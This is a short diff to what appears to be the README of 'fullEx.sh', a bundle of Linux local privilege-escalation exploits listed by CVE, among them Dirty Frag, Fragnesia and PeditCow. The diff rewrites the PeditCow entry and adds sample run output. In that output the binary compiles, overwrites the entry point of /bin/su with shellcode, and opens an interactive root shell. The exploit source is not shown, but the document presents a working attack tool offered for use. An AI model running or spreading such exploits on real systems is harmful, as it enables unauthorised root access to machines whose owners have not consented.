@@ -67,7 +67,7 @@ Exploits:
    -DirtyFrag     Dirty Frag - CVE-2026-43284
    -Fragnesia     Fragnesia - CVE-2026-46300
    -DirtyDecrypt  pwn-key-ssh & chage - CVE-2026-31635
-   -PeditCow      PeditCow - CVE-2026-46331
+   -PeditCow      Compilation + execution binaire - CVE-2026-46331
  
 Cmds:
    -check         Verifie si gcc est installer
@@ -393,6 +393,9 @@ AQIDBA==
 
 ```
 user@debian:~/fullEx$ ./fullEx.sh -PeditCow
+[+] Compilation successfuly !
+[+] PATH=${PWD}/exploits/PeditCow/a.out
+[+] Executing the binary...
 [*] target /bin/su as uid 1001; entry at file offset 0x4330; shellcode 48 bytes
 [+] su entry overwritten; exec'ing su -> interactive root shell
 # id
